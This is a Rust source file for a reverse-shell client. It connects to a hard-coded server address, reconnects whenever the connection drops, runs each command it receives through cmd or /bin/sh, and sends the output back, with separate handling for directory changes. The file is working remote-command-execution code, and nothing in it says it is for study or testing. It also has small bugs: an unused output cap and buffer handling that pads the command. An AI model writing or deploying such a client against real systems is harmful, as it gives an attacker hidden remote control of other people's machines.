#[derive(Debug)]
struct Client {
  stream: std::net::TcpStream
}

type ResBErr<T> = Result<T, Box<dyn std::error::Error + 'static>>;

impl Client {
  fn new(con: &str) -> ResBErr<Self> {
    let mut stream = std::net::TcpStream::connect(con);

    loop {
      match &stream {
        Ok(_) => break,
        Err(e) => {
          eprintln!("Error connecting to {}: {}", con, e);
          eprintln!("Retrying connection...");
          std::thread::sleep(std::time::Duration::from_millis(2500));
          stream = std::net::TcpStream::connect(con);
        }
      }
    }

    println!("Client connected to server!");

    Ok(Client { stream: stream.unwrap() }) // error has been dealt with in an infinite loop, can only be broken if it is Ok()
  }

  fn send(&mut self, data: &[u8]) -> ResBErr<()> {
    use std::io::Write;

    match self.stream.write(data) {
      Ok(bytes_written) => {
        println!("Write success - Sent {:?} bytes!", bytes_written);
      },
      Err(e) => {
        eprintln!("Error writing to server: {}", e);
        eprintln!("Attempting to reconnect...");
        *self = Client::new(ipp)?;
      }
    }

    Ok(())
  }
}

fn handle_command(client: &mut Client, cmd: &str, out: std::process::Output) -> ResBErr<()> {
  let mut out = String::from_utf8_lossy(&out.stdout);

  if cmd.contains("cd") {
    let current_dir = std::env::current_dir()?.into_os_string().into_string().unwrap();
    let new_dir = cmd.split_ascii_whitespace().nth(1).unwrap_or(""); 
    let path: std::ffi::OsString = format!("{}/{}", current_dir, new_dir).into();
    let path = std::path::Path::new(&path);
    std::env::set_current_dir(path);
    out = std::borrow::Cow::Owned(format!("Directory changed to {}", new_dir));
  } else {
    if out.len() == 0 {
      client.send(b"<No Output>")?;
      return Ok(());
    }
  }

  let bytes = out.as_bytes();
  let cap: usize = if CAP > bytes.len() { bytes.len() } else { CAP };
  client.send(&bytes)?;

  Ok(())
}

const ipp: &str = "127.0.0.1:34254";
const CAP: usize = 12 * 1024;

fn main() -> ResBErr<()> {
  use std::io::BufRead;

  println!("Client running...");

  let mut client = Client::new(ipp)?;

  loop {
    let mut buffer = vec![0; 256];
    let mut reader = std::io::BufReader::new(&client.stream);
    reader.read_until(b'\n', &mut buffer)?; // potential bug of reading past bounds

    let mut cmd = std::str::from_utf8(&buffer[..]).unwrap().trim().trim_matches(0 as char);
    println!("Command is '{}'", cmd);

    // run windows/unix specific command
    if cfg!(windows) {
      println!("Windows system!");
      match std::process::Command::new("cmd")
        .arg("/c")
        .arg(cmd)
        .output() {
        Ok(out) => {
          handle_command(&mut client, cmd, out)?;
        },
        Err(e) => {
          eprintln!("Error running windows command: {}", e);
        }
      }

    } else {
      println!("Not a windows system!");
      match std::process::Command::new("/bin/sh")
        .arg("-c")
        .arg(cmd)
        .output() {
        Ok(out) => {
          // create array of custom commands and run different functions for them (ie.. cd, exit)
          handle_command(&mut client, cmd, out)?;
        },
        Err(e) => {
          eprintln!("Error running unix command: {}", e);
        }
      }

    } // end of cfg!(windows) check
  }

  Ok(())
}
